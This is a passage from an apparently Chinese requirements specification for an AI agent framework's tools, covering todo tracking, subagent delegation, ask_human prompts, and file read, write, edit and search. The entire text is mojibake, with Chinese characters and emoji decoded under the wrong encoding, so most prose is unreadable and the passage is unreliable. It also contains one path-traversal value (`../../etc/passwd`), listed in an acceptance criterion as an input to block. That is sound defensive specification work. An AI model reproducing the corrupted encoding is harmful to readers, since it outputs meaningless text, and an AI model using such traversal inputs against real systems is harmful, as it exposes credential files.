- âœ… åˆ é™¤ä»»åŠ¡: ä»åˆ—è¡¨ä¸­ç§»é™¤
- âœ… çŠ¶æ€ç®¡ç†: pending/in_progress/completed
- âœ… çŠ¶æ€åŒæ­¥: ä½¿ç”¨LangGraph Commandæ›´æ–°state["todos"]

**ä»»åŠ¡æ¨¡å‹**:
```python
{
    "content": "è¿è¡Œæµ‹è¯•",        # å‘½ä»¤å¼(åšä»€ä¹ˆ)
    "activeForm": "æ­£åœ¨è¿è¡Œæµ‹è¯•",  # è¿›è¡Œæ—¶(æ­£åœ¨åšä»€ä¹ˆ)
    "status": "in_progress"       # pending/in_progress/completed
}
```

**é‡è¦çº¦æŸ**:
- âš ï¸ TODOæ˜¯**è¿½è¸ªå·¥å…·**,ä¸æ˜¯æ‰§è¡Œå·¥å…·
- âš ï¸ å¿…é¡»å…ˆæ‰§è¡Œå®é™…å·¥å…·(read_file/web_search),å†æ ‡è®°å®Œæˆ
- âš ï¸ ç¦æ­¢"åˆ›å»ºTODO â†’ ç«‹å³å…¨éƒ¨æ ‡è®°å®Œæˆ"çš„åæ¨¡å¼
- âš ï¸ åŒæ—¶åªèƒ½æœ‰1ä¸ªin_progressä»»åŠ¡

**ä½¿ç”¨åœºæ™¯**:
1. **ä»»åŠ¡åˆ†è§£**: å°†å¤§ä»»åŠ¡æ‹†åˆ†ä¸ºå­ä»»åŠ¡åˆ—è¡¨
2. **è¿›åº¦è¿½è¸ª**: å®æ—¶æ˜¾ç¤ºå½“å‰æ‰§è¡Œåˆ°å“ªä¸€æ­¥
3. **å›¢é˜Ÿåä½œ**: æ˜ç¡®ä»»åŠ¡åˆ†é…å’Œå®ŒæˆçŠ¶æ€
4. **è´¨é‡ä¿è¯**: ç¡®ä¿æ‰€æœ‰æ­¥éª¤éƒ½å·²å®Œæˆ

**åæ¨¡å¼ç¤ºä¾‹**:
```
âŒ é”™è¯¯:
Agent> [Calls todo_write([task1, task2, task3])]
Agent> [Calls todo_write(mark task1 completed)]
Agent> [Calls todo_write(mark task2 completed)]
Agent> [Calls todo_write(mark task3 completed)]
# æ²¡æœ‰å®é™…æ‰§è¡Œä»»ä½•å·¥å…·!

âœ… æ­£ç¡®:
Agent> [Calls todo_write([task1, task2, task3])]
Agent> [Calls todo_write(mark task1 in_progress)]
Agent> [Calls read_file(...)]  # å®é™…æ‰§è¡Œ
Agent> [Calls web_search(...)]  # å®é™…æ‰§è¡Œ
Agent> [Calls todo_write(mark task1 completed)]
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… ä»»åŠ¡åˆ›å»ºåç«‹å³åœ¨state["todos"]ä¸­å¯è§
- âœ… çŠ¶æ€æ›´æ–°é€šè¿‡LangGraph CommandåŒæ­¥
- âœ… åŒæ—¶æœ€å¤š1ä¸ªin_progressä»»åŠ¡
- âœ… ä»»åŠ¡å®Œæˆå‰å¿…é¡»æœ‰å·¥å…·è°ƒç”¨è®°å½•(é€šè¿‡promptå¼ºåŒ–)

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/todo_write.py`

---

#### FR-TOOL-003: todo_readå·¥å…· - ä»»åŠ¡æŸ¥çœ‹

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æä¾›æŸ¥çœ‹å½“å‰ä»»åŠ¡åˆ—è¡¨çš„å·¥å…·,æ”¯æŒAgentæ£€æŸ¥ä»»åŠ¡çŠ¶æ€ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… æ˜¾ç¤ºæ‰€æœ‰ä»»åŠ¡
- âœ… æ˜¾ç¤ºä»»åŠ¡çŠ¶æ€(pending/in_progress/completed)
- âœ… æ ¼å¼åŒ–è¾“å‡º,æ˜“äºé˜…è¯»

**è¾“å‡ºæ ¼å¼**:
```
ä»»åŠ¡åˆ—è¡¨:
1. [in_progress] æ­£åœ¨è¿è¡Œæµ‹è¯•
2. [pending] åˆ†ææµ‹è¯•ç»“æœ
3. [completed] é˜…è¯»ä»£ç æ–‡ä»¶
```

**ä½¿ç”¨åœºæ™¯**:
- Agentéœ€è¦æŸ¥çœ‹å½“å‰è¿›åº¦
- ç”¨æˆ·è¯¢é—®"ç°åœ¨åœ¨åšä»€ä¹ˆ?"
- éªŒè¯ä»»åŠ¡æ˜¯å¦å…¨éƒ¨å®Œæˆ

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ˜¾ç¤ºæ‰€æœ‰ä»»åŠ¡(åŒ…æ‹¬completed)
- âœ… çŠ¶æ€æ ‡ç­¾æ¸…æ™°å¯è§
- âœ… å“åº”æ—¶é—´<50ms

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/todo_read.py`

---

#### FR-TOOL-004: delegate_taskå·¥å…· - å­ä»»åŠ¡å§”æ´¾

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒåˆ›å»ºåŒç±»å‹subagent,å§”æ´¾å­ä»»åŠ¡æ‰§è¡Œ,å®ç°ä»»åŠ¡åˆ†è§£å’Œå¹¶è¡Œå¤„ç†ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **åŒç±»å‹å‰¯æœ¬**: Subagentä½¿ç”¨ä¸ä¸»Agentç›¸åŒçš„æ¨¡æ¿(GeneralAgent)
- âœ… **ä¸Šä¸‹æ–‡ç»§æ‰¿**: ç»§æ‰¿mentioned_agentsã€active_skillã€workspace_pathã€uploaded_files
- âœ… **ä¸Šä¸‹æ–‡éš”ç¦»**: ç‹¬ç«‹çš„messagesã€todosã€loops
- âœ… **ç»¼åˆæ€»ç»“**: Subagentå¿…é¡»æä¾›è¯¦ç»†æ‰§è¡Œæ€»ç»“(å·¥å…·å†å²å¯¹ä¸»Agentä¸å¯è§)
- âœ… **è¿ç»­æœºåˆ¶**: æ£€æµ‹è¿‡çŸ­å“åº”(<200å­—ç¬¦),è‡ªåŠ¨è¯·æ±‚è¯¦ç»†æ€»ç»“(æœ€å¤š1æ¬¡)
- âœ… **HITLæ”¯æŒ**: Subagentå¯ä½¿ç”¨ask_humanå‘ç”¨æˆ·æé—®
- âœ… **ä¸­æ–­å¤„ç†**: æ”¯æŒinterruptæ¢å¤å’Œç”¨æˆ·è¾“å…¥

**ä¸Šä¸‹æ–‡éš”ç¦»è®¾è®¡**:
```
MainAgent (context_id="main")
  â”œâ”€â”€ messages: [msg1, msg2, ..., msg100]  â† ä¸»å¯¹è¯å†å²
  â”œâ”€â”€ todos: [task1, task2]
  â””â”€â”€ mentioned_agents: ["@pdf"]

  â””â”€â”€ delegate_task("åˆ†æPDFæ–‡ä»¶")

      Subagent (context_id="subagent-abc123")
        â”œâ”€â”€ messages: [task_description]   â† åªæœ‰ä»»åŠ¡æè¿°!
        â”œâ”€â”€ todos: []                      â† ç‹¬ç«‹ä»»åŠ¡åˆ—è¡¨
        â”œâ”€â”€ mentioned_agents: ["@pdf"]     â† ç»§æ‰¿
        â”œâ”€â”€ workspace_path: same           â† ç»§æ‰¿
        â”œâ”€â”€ uploaded_files: same           â† ç»§æ‰¿
        â””â”€â”€ parent_context: "main"         â† çˆ¶å¼•ç”¨
```

**å…³é”®çº¦æŸ**:
- âš ï¸ Subagentçœ‹ä¸åˆ°ä¸»å¯¹è¯å†å² â†’ ä»»åŠ¡æè¿°å¿…é¡»è‡ªåŒ…å«(self-contained)
- âš ï¸ ä¸»Agentåªçœ‹åˆ°Subagentçš„æœ€åä¸€æ¡æ¶ˆæ¯ â†’ å¿…é¡»æ˜¯è¯¦ç»†æ€»ç»“
- âš ï¸ Subagentä¸èƒ½è°ƒç”¨delegate_task â†’ é˜²æ­¢æ— é™åµŒå¥—

**è¿ç»­æœºåˆ¶**:
```python
# æ£€æµ‹è¿‡çŸ­å“åº”
if len(last_message.content) < 200:
    # è‡ªåŠ¨è¯·æ±‚è¯¦ç»†æ€»ç»“
    continuation_prompt = """
    è¯·æä¾›æ›´è¯¦ç»†çš„æ€»ç»“ã€‚è®°ä½:
    1. ä¸»Agentçœ‹ä¸åˆ°ä½ çš„å·¥å…·è°ƒç”¨å†å²
    2. ä½ éœ€è¦è¯¦ç»†è¯´æ˜ä½ åšäº†ä»€ä¹ˆã€å‘ç°äº†ä»€ä¹ˆ
    3. åŒ…å«å…³é”®ä¿¡æ¯ã€æ–‡ä»¶è·¯å¾„ã€æ•°æ®ç»“æœ
    """
    # æœ€å¤šé‡è¯•1æ¬¡
```

**ä½¿ç”¨åœºæ™¯**:
1. **æœç´¢ä»»åŠ¡**: "æœç´¢Python 3.13æ–°ç‰¹æ€§"
2. **è°ƒè¯•ä»»åŠ¡**: "æ‰¾åˆ°ä»£ç ä¸­æ‰€æœ‰ä½¿ç”¨deprecated APIçš„åœ°æ–¹"
3. **æ–‡æ¡£åˆ†æ**: "åˆ†æè¿™ä¸ª50é¡µçš„PDFæŠ¥å‘Š,æ€»ç»“å…³é”®ä¿¡æ¯"
4. **æ•°æ®å¤„ç†**: "å¤„ç†è¿™ä¸ªExcelè¡¨æ ¼,ç”Ÿæˆç»Ÿè®¡æŠ¥å‘Š"

**éªŒæ”¶æ ‡å‡†**:
- âœ… Subagentèƒ½è®¿é—®ç»§æ‰¿çš„å·¥å…·å’ŒæŠ€èƒ½
- âœ… Subagentä¸èƒ½è®¿é—®ä¸»å¯¹è¯å†å²
- âœ… æœ€åä¸€æ¡æ¶ˆæ¯â‰¥200å­—ç¬¦(æˆ–ç»è¿‡1æ¬¡è¿ç»­è¯·æ±‚)
- âœ… æ€»ç»“åŒ…å«:åšäº†ä»€ä¹ˆã€å‘ç°äº†ä»€ä¹ˆã€ç»“æœæ˜¯ä»€ä¹ˆ
- âœ… Subagentå¯ä»¥ä½¿ç”¨ask_humanå·¥å…·
- âœ… ç”¨æˆ·è¾“å…¥å¸¦`[subagent-xxx]`å‰ç¼€(æ¸…æ™°åŒºåˆ†)

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/delegate_task.py`

---

#### FR-TOOL-005: call_agentå·¥å…· - è·¨ç±»å‹Agentè°ƒç”¨

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒè·¨ç±»å‹Agentè°ƒç”¨,å…è®¸GeneralAgentè°ƒç”¨SimpleAgentæˆ–å…¶ä»–ä¸“ç”¨Agentã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **è·¨ç±»å‹è°ƒç”¨**: ä»GeneralAgentè°ƒç”¨ä¸åŒç±»å‹Agent
- âœ… **èƒ½åŠ›åˆ‡æ¢**: åˆ©ç”¨ä¸“ç”¨Agentçš„ç‰¹å®šèƒ½åŠ›
- âœ… **è¿”å›Command**: ä½¿ç”¨LangGraph Commandå¯¹è±¡æ›´æ–°çˆ¶çŠ¶æ€
- âœ… **å‚æ•°ä¼ é€’**: æ”¯æŒå¤æ‚å‚æ•°å’Œä¸Šä¸‹æ–‡ä¿¡æ¯

**ä½¿ç”¨åœºæ™¯**:
1. **ä»£ç åˆ†æ**: è°ƒç”¨CodeAgentåˆ†æä»£ç è´¨é‡
2. **å¿«é€ŸæŸ¥è¯¢**: è°ƒç”¨SimpleAgentå¤„ç†ç®€å•é—®ç­”
3. **ä¸“ä¸šä»»åŠ¡**: è°ƒç”¨é¢†åŸŸä¸“ç”¨Agent(å¦‚FinanceAgent)

**ä¸delegate_taskå¯¹æ¯”**:

| ç‰¹æ€§ | delegate_task | call_agent |
|------|---------------|------------|
| Agentç±»å‹ | åŒç±»å‹(GeneralAgent) | è·¨ç±»å‹(SimpleAgentç­‰) |
| ä¸Šä¸‹æ–‡ç»§æ‰¿ | éƒ¨åˆ†ç»§æ‰¿(å·¥å…·/æŠ€èƒ½/æ–‡ä»¶) | å®Œå…¨ç‹¬ç«‹ |
| å¯¹è¯å†å² | éš”ç¦»(åªæœ‰ä»»åŠ¡æè¿°) | ç‹¬ç«‹ |
| é€‚ç”¨åœºæ™¯ | ä»»åŠ¡åˆ†è§£ã€å¹¶è¡Œå¤„ç† | èƒ½åŠ›åˆ‡æ¢ã€ä¸“ä¸šä»»åŠ¡ |

**éªŒæ”¶æ ‡å‡†**:
- âœ… èƒ½è°ƒç”¨AgentRegistryä¸­æ³¨å†Œçš„ä»»ä½•Agent
- âœ… è¿”å›ç»“æœé€šè¿‡Commandæ›´æ–°çˆ¶çŠ¶æ€
- âœ… è°ƒç”¨å¤±è´¥æ—¶æœ‰æ˜ç¡®é”™è¯¯ä¿¡æ¯
- âœ… æ”¯æŒè¶…æ—¶æ§åˆ¶

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/call_agent.py`

---

#### FR-TOOL-006: ask_humanå·¥å…· - äººæœºäº¤äº’

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒAgentä¸»åŠ¨è¯·æ±‚ç”¨æˆ·ä¿¡æ¯,å®ç°äººæœºååŒå’Œäº¤äº’å¼å·¥ä½œæµã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **ä¸»åŠ¨æé—®**: Agentå¯åœ¨éœ€è¦æ—¶è¯·æ±‚ç”¨æˆ·è¾“å…¥
- âœ… **ä¸Šä¸‹æ–‡æä¾›**: å¯é™„åŠ é¢å¤–ä¸Šä¸‹æ–‡ä¿¡æ¯
- âœ… **é»˜è®¤å€¼**: æ”¯æŒè®¾ç½®é»˜è®¤å€¼
- âœ… **å¿…å¡«/å¯é€‰**: æ§åˆ¶ç”¨æˆ·æ˜¯å¦å¿…é¡»å›ç­”
- âœ… **interruptæœºåˆ¶**: ä½¿ç”¨LangGraph interruptæš‚åœæ‰§è¡Œ
- âœ… **æ¢å¤æ‰§è¡Œ**: ç”¨æˆ·å›ç­”åé€šè¿‡Commandæ¢å¤

**å·¥å…·ç­¾å**:
```python
def ask_human(
    question: str,              # é—®é¢˜
    context: str = "",          # é¢å¤–ä¸Šä¸‹æ–‡
    input_type: str = "text",   # è¾“å…¥ç±»å‹(å½“å‰ä»…æ”¯æŒtext)
    default: Optional[str] = None,  # é»˜è®¤å€¼
    required: bool = True       # æ˜¯å¦å¿…å¡«
) -> str:
    """å‘ç”¨æˆ·è¯·æ±‚ä¿¡æ¯"""
```

**ä½¿ç”¨åœºæ™¯**:
1. **ç¼ºå°‘ä¿¡æ¯**: "æ‚¨å¸Œæœ›æŠ¥å‘Šä»¥ä»€ä¹ˆæ ¼å¼è¾“å‡º?(PDF/Word/Markdown)"
2. **ç¡®è®¤å†³ç­–**: "å³å°†åˆ é™¤10ä¸ªæ–‡ä»¶,æ˜¯å¦ç»§ç»­?"
3. **å¤šé€‰é¡¹**: "æ‰¾åˆ°3ä¸ªå¯èƒ½çš„è§£å†³æ–¹æ¡ˆ,æ‚¨é€‰æ‹©å“ªä¸€ä¸ª?"
4. **ç”¨æˆ·åå¥½**: "æ‚¨åå¥½ä½¿ç”¨å“ªä¸ªæ¨¡å‹?(GPT-4/Claude/Gemini)"

**ç”¨æˆ·ä½“éªŒ**:
```
Agent> æˆ‘éœ€è¦äº†è§£æ‚¨çš„åå¥½æ‰èƒ½ç»§ç»­ã€‚

ğŸ’¬ æ‚¨å¸Œæœ›æŠ¥å‘Šä»¥ä»€ä¹ˆæ ¼å¼è¾“å‡º?
   (é»˜è®¤: markdown)
> PDF

Agent> å¥½çš„,æˆ‘å°†ç”ŸæˆPDFæ ¼å¼çš„æŠ¥å‘Šã€‚
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… interruptè§¦å‘åAgentæ‰§è¡Œæš‚åœ
- âœ… ç”¨æˆ·è¾“å…¥åAgentä»æš‚åœç‚¹æ¢å¤
- âœ… æ”¯æŒé»˜è®¤å€¼(ç”¨æˆ·å¯ç›´æ¥å›è½¦ä½¿ç”¨)
- âœ… required=Falseæ—¶å…è®¸ç©ºè¾“å…¥
- âœ… ç”¨æˆ·è¾“å…¥ä½œä¸ºToolMessageè¿”å›ç»™Agent

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/ask_human.py`

---

### æ–‡ä»¶æ“ä½œå·¥å…·éœ€æ±‚

#### FR-TOOL-007: read_fileå·¥å…· - å¤šæ ¼å¼æ–‡ä»¶è¯»å–

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒè¯»å–å¤šç§æ ¼å¼æ–‡ä»¶,è‡ªåŠ¨æ£€æµ‹æ ¼å¼å¹¶æå–å†…å®¹,ä¸ºAgentæä¾›æ–‡ä»¶è®¿é—®èƒ½åŠ›ã€‚

**æ”¯æŒæ ¼å¼**:

| æ ¼å¼ | å°æ–‡ä»¶é˜ˆå€¼ | å°æ–‡ä»¶å¤„ç† | å¤§æ–‡ä»¶å¤„ç† |
|------|-----------|----------|----------|
| **æ–‡æœ¬** | 100KB | å®Œæ•´å†…å®¹ | å‰50Kå­—ç¬¦+æˆªæ–­æç¤º |
| **PDF** | â‰¤10é¡µ | å®Œæ•´å†…å®¹ | å‰10é¡µé¢„è§ˆ+æœç´¢æç¤º |
| **DOCX** | â‰¤10é¡µ | å®Œæ•´å†…å®¹ | å‰10é¡µé¢„è§ˆ+æœç´¢æç¤º |
| **XLSX** | â‰¤3ä¸ªè¡¨ | å®Œæ•´å†…å®¹ | å‰3ä¸ªè¡¨é¢„è§ˆ+æœç´¢æç¤º |
| **PPTX** | â‰¤15å¼  | å®Œæ•´å†…å®¹ | å‰15å¼ é¢„è§ˆ+æœç´¢æç¤º |

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **è‡ªåŠ¨æ ¼å¼æ£€æµ‹**: æ ¹æ®æ–‡ä»¶æ‰©å±•åé€‰æ‹©æå–å™¨
- âœ… **æ–‡æœ¬æ–‡ä»¶**: ç›´æ¥è¯»å–å†…å®¹
- âœ… **PDF**: PyPDF2æå–æ–‡æœ¬,ä¿ç•™é¡µç 
- âœ… **DOCX**: python-docxæå–æ®µè½å’Œè¡¨æ ¼
- âœ… **XLSX**: openpyxlæå–è¡¨æ ¼æ•°æ®
- âœ… **PPTX**: python-pptxæå–å¹»ç¯ç‰‡å†…å®¹
- âœ… **å¤§æ–‡ä»¶é¢„è§ˆ**: é¿å…tokenè¶…é™,æä¾›æœç´¢å»ºè®®
- âœ… **é”™è¯¯å¤„ç†**: æ ¼å¼æŸåæ—¶è¿”å›å‹å¥½é”™è¯¯

**å¤§æ–‡ä»¶å¤„ç†ç­–ç•¥**:
```
å¤§PDF(50é¡µ):
  â†’ é¢„è§ˆå‰10é¡µ(~30K chars)
  â†’ æç¤º: "æ–‡ä»¶è¾ƒå¤§,å»ºè®®ä½¿ç”¨ search_file å·¥å…·æœç´¢å…³é”®å†…å®¹"
  â†’ æ˜¾ç¤ºæ–‡ä»¶å…ƒä¿¡æ¯: æ€»é¡µæ•°ã€å¤§å°

å¤§Excel(10ä¸ªè¡¨):
  â†’ é¢„è§ˆå‰3ä¸ªè¡¨(~20K chars)
  â†’ æç¤º: "æ›´å¤šè¡¨æ ¼è¯·ä½¿ç”¨ search_file æœç´¢,æˆ–æŒ‡å®šè¡¨å"
```

**ä½¿ç”¨åœºæ™¯**:
1. **é˜…è¯»ä»£ç **: `read_file("src/main.py")`
2. **æŸ¥çœ‹æŠ¥å‘Š**: `read_file("uploads/annual_report.pdf")`
3. **æ£€æŸ¥é…ç½®**: `read_file("config.yaml")`
4. **é˜…è¯»æŠ€èƒ½æ–‡æ¡£**: `read_file("skills/pdf/SKILL.md")`

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ‰€æœ‰æ”¯æŒæ ¼å¼èƒ½æ­£ç¡®æå–å†…å®¹
- âœ… å¤§æ–‡ä»¶è¿”å›é¢„è§ˆè€Œéå®Œæ•´å†…å®¹
- âœ… é”™è¯¯ä¿¡æ¯æ¸…æ™°(å¦‚"æ–‡ä»¶ä¸å­˜åœ¨"ã€"æ ¼å¼ä¸æ”¯æŒ")
- âœ… è·¯å¾„å¿…é¡»åœ¨workspaceå†…(å®‰å…¨æ£€æŸ¥)

**å‚è€ƒä»£ç **:
- `generalAgent/tools/builtin/file_ops.py:read_file`
- `generalAgent/utils/document_extractors.py`

---

#### FR-TOOL-008: write_fileå·¥å…· - æ–‡ä»¶åˆ›å»º

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒåœ¨workspaceä¸­åˆ›å»ºæ–°æ–‡ä»¶,éµå¾ª"æ¡†æ¶ä¼˜å…ˆã€å†…å®¹åè¡¥"çš„æœ€ä½³å®è·µã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **åˆ›å»ºæ–°æ–‡ä»¶**: åœ¨workspace/outputs/æˆ–workspace/temp/åˆ›å»ºæ–‡ä»¶
- âœ… **è¦†ç›–å†™å…¥**: å¦‚æœæ–‡ä»¶å·²å­˜åœ¨,è¦†ç›–å†…å®¹
- âœ… **è·¯å¾„å®‰å…¨**: åªèƒ½å†™å…¥outputs/ã€temp/ã€uploads/ç›®å½•
- âœ… **è‡ªåŠ¨åˆ›å»ºç›®å½•**: çˆ¶ç›®å½•ä¸å­˜åœ¨æ—¶è‡ªåŠ¨åˆ›å»º

**æœ€ä½³å®è·µ**(Claude Code Pattern):
```
âš ï¸ å¯¹äºæ–°æ–‡ä»¶:
1. write_file åˆ›å»ºæ¡†æ¶(ä½¿ç”¨ [TBD] æ ‡è®°å¾…å®Œæˆéƒ¨åˆ†)
2. edit_file é€èŠ‚å±•å¼€å†…å®¹

âš ï¸ å¯¹äºç°æœ‰æ–‡ä»¶:
1. ç›´æ¥ä½¿ç”¨ edit_file ä¿®æ”¹

ä¸ºä»€ä¹ˆ?
- Tokené«˜æ•ˆ: edit_fileåªä¼ è¾“å˜åŒ–éƒ¨åˆ†,ä¸ä¼šè¢«æˆªæ–­
- ä¸ä¼šè¢«æˆªæ–­: å¢é‡ä¿®æ”¹æ€»èƒ½fit within max_completion_tokens
- æ›´å®‰å…¨: ä¿ç•™æœªå˜åŒ–å†…å®¹
```

**åæ¨¡å¼ç¤ºä¾‹**:
```
âŒ é”™è¯¯: ä¸€æ¬¡æ€§write_fileå…¨éƒ¨å†…å®¹(ä¼šè¢«æˆªæ–­)
write_file("outputs/long_report.md", """
# 20å¤©æ—…è¡Œè®¡åˆ’
## ç¬¬1å¤©: ä¸œäº¬
...
## ç¬¬20å¤©: å¤§é˜ª
(3000è¡Œå†…å®¹)
""")
â†’ Result: å†…å®¹è¢«æˆªæ–­,JSON parse error

âœ… æ­£ç¡®: write_fileæ¡†æ¶ + edit_fileå±•å¼€
write_file("outputs/long_report.md", """
# 20å¤©æ—…è¡Œè®¡åˆ’
## ç¬¬1å¤©: [TBD]
## ç¬¬2å¤©: [TBD]
...
## ç¬¬20å¤©: [TBD]
""")

edit_file(
    file_path="outputs/long_report.md",
    old_string="## ç¬¬1å¤©: [TBD]",
    new_string="## ç¬¬1å¤©: ä¸œäº¬\n- ä¸Šåˆ: æµ…è‰å¯º\n- ä¸‹åˆ: ç§‹å¶åŸ\n..."
)
```

**ä½¿ç”¨åœºæ™¯**:
1. **ç”ŸæˆæŠ¥å‘Š**: åˆ›å»ºMarkdown/PDFæŠ¥å‘Š
2. **ä¿å­˜ç»“æœ**: ä¿å­˜åˆ†æç»“æœä¸ºJSON
3. **åˆ›å»ºé…ç½®**: ç”ŸæˆYAMLé…ç½®æ–‡ä»¶
4. **å¯¼å‡ºæ•°æ®**: ä¿å­˜CSVæ•°æ®æ–‡ä»¶

**éªŒæ”¶æ ‡å‡†**:
- âœ… åªèƒ½å†™å…¥outputs/ã€temp/ã€uploads/ç›®å½•
- âœ… è·¯å¾„traversalæ”»å‡»è¢«æ‹¦æˆª(å¦‚`../../etc/passwd`)
- âœ… æ–‡ä»¶åˆ›å»ºæˆåŠŸè¿”å›æ–‡ä»¶è·¯å¾„
- âœ… SystemMessageå’Œå·¥å…·docstringéƒ½å¼ºè°ƒæœ€ä½³å®è·µ

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/file_ops.py:write_file`

---

#### FR-TOOL-009: edit_fileå·¥å…· - ç²¾ç¡®æ–‡ä»¶ç¼–è¾‘

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒç²¾ç¡®çš„å­—ç¬¦ä¸²æ›¿æ¢ç¼–è¾‘,å®ç°tokené«˜æ•ˆçš„æ–‡ä»¶ä¿®æ”¹ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **ç²¾ç¡®æ›¿æ¢**: å°†old_stringæ›¿æ¢ä¸ºnew_string
- âœ… **å…¨å±€æ›¿æ¢**: replace_all=trueæ›¿æ¢æ‰€æœ‰å‡ºç°
- âœ… **å”¯ä¸€æ€§æ£€æŸ¥**: old_stringå¿…é¡»å”¯ä¸€(é™¤éreplace_all)
- âœ… **Tokené«˜æ•ˆ**: åªä¼ è¾“å˜åŒ–éƒ¨åˆ†,ä¸ä¼šè¢«æˆªæ–­
- âœ… **å®‰å…¨æ€§**: ä¿ç•™æœªå˜åŒ–å†…å®¹

**å·¥å…·ç­¾å**:
```python
def edit_file(
    file_path: str,        # æ–‡ä»¶è·¯å¾„(workspaceç›¸å¯¹è·¯å¾„)
    old_string: str,       # è¦æ›¿æ¢çš„å­—ç¬¦ä¸²(å¿…é¡»å”¯ä¸€)
    new_string: str,       # æ›¿æ¢åçš„å­—ç¬¦ä¸²
    replace_all: bool = False  # æ˜¯å¦æ›¿æ¢æ‰€æœ‰å‡ºç°
) -> str:
    """ç²¾ç¡®æ›¿æ¢æ–‡ä»¶å†…å®¹"""
```

**å”¯ä¸€æ€§æ£€æŸ¥**:
```python
# åœºæ™¯1: old_stringå”¯ä¸€ â†’ æˆåŠŸ
edit_file(
    "report.md",
    old_string="## ç¬¬1å¤©: [TBD]",
    new_string="## ç¬¬1å¤©: ä¸œäº¬\n- æµ…è‰å¯º\n- ç§‹å¶åŸ"
)
âœ… Success

# åœºæ™¯2: old_stringä¸å”¯ä¸€ â†’ å¤±è´¥
edit_file(
    "report.md",
    old_string="[TBD]",  # å‡ºç°20æ¬¡!
    new_string="ä¸œäº¬"
)
âŒ Error: "old_string appears 20 times. Use replace_all or provide more context"

# åœºæ™¯3: ä½¿ç”¨replace_all
edit_file(
    "config.yaml",
    old_string="enabled: false",
    new_string="enabled: true",
    replace_all=True  # æ›¿æ¢æ‰€æœ‰enabled: false
)
âœ… Success: Replaced 5 occurrences
```

**ä¸ºä»€ä¹ˆTokené«˜æ•ˆ**:
- write_file: ä¼ è¾“æ•´ä¸ªæ–‡ä»¶(å¯èƒ½å‡ åƒè¡Œ) â†’ å®¹æ˜“è¢«æˆªæ–­
- edit_file: åªä¼ è¾“old_string + new_string(å‡ ç™¾tokens) â†’ æ°¸ä¸æˆªæ–­

**ä½¿ç”¨åœºæ™¯**:
1. **å±•å¼€æ¡†æ¶**: å°†[TBD]æ›¿æ¢ä¸ºå®é™…å†…å®¹
2. **ä¿®å¤é”™è¯¯**: æ›¿æ¢ä»£ç ä¸­çš„bug
3. **æ›´æ–°é…ç½®**: ä¿®æ”¹é…ç½®æ–‡ä»¶å‚æ•°
4. **é‡å‘½å**: å…¨å±€æ›¿æ¢å˜é‡å(replace_all=True)

**éªŒæ”¶æ ‡å‡†**:
- âœ… old_stringä¸å”¯ä¸€æ—¶è¿”å›é”™è¯¯(é™¤éreplace_all)
- âœ… æ–‡ä»¶ä¸å­˜åœ¨æ—¶è¿”å›é”™è¯¯
- âœ… è·¯å¾„å¿…é¡»åœ¨workspaceå†…
- âœ… æ›¿æ¢æˆåŠŸè¿”å›æˆåŠŸæ¶ˆæ¯

**å‚è€ƒä»£ç **: `generalAgent/tools/builtin/edit_file.py`

---

#### FR-TOOL-010: find_fileså·¥å…· - æ–‡ä»¶åæœç´¢

**éœ€æ±‚æè¿°**:
ç³»ç»Ÿåº”æ”¯æŒåŸºäºglobæ¨¡å¼çš„æ–‡ä»¶åå¿«é€Ÿæœç´¢,å¸®åŠ©Agentå®šä½æ–‡ä»¶ã€‚

**æ ¸å¿ƒèƒ½åŠ›**:
- âœ… **Globæ¨¡å¼**: æ”¯æŒ`*`ã€`**`ã€`?`ã€`{}`é€šé…ç¬¦
- âœ… **é€’å½’æœç´¢**: `**`è¡¨ç¤ºé€’å½’æ‰€æœ‰å­ç›®å½•
- âœ… **å¤šæ‰©å±•å**: `*.{pdf,docx}`åŒæ—¶åŒ¹é…å¤šç§æ ¼å¼
- âœ… **å®æ—¶æœç´¢**: æ— ç´¢å¼•,ç›´æ¥æ‰«ææ–‡ä»¶ç³»ç»Ÿ(<10ms)

**æœç´¢æ¨¡å¼ç¤ºä¾‹**:
```python
# æ‰€æœ‰PDFæ–‡ä»¶
find_files("*.pdf")
â†’ ["uploads/report.pdf", "outputs/summary.pdf"]

# é€’å½’æœç´¢æ‰€æœ‰Pythonæ–‡ä»¶
find_files("**/*.py")
â†’ ["skills/pdf/scripts/extract.py", "outputs/script.py"]

# æŒ‡å®šç›®å½•æœç´¢
find_files("*report*", path="uploads")
â†’ ["uploads/annual_report.pdf", "uploads/report_2024.docx"]

# å¤šä¸ªæ‰©å±•å
find_files("*.{pdf,docx,xlsx}")
â†’ ["uploads/file1.pdf", "uploads/file2.docx", "uploads/file3.xlsx"]
```

**ä½¿ç”¨åœºæ™¯**:
1. **å®šä½ä¸Šä¼ æ–‡ä»¶**: ç”¨æˆ·è¯´"å¤„ç†é‚£ä¸ªPDF",Agentæœç´¢`*.pdf`
2. **æŸ¥æ‰¾è„šæœ¬**: æŸ¥æ‰¾æŠ€èƒ½åŒ…ä¸­çš„Pythonè„šæœ¬
3. **æ‰¹é‡æ“ä½œ**: æ‰¾åˆ°æ‰€æœ‰Markdownæ–‡ä»¶è¿›è¡Œå¤„ç†
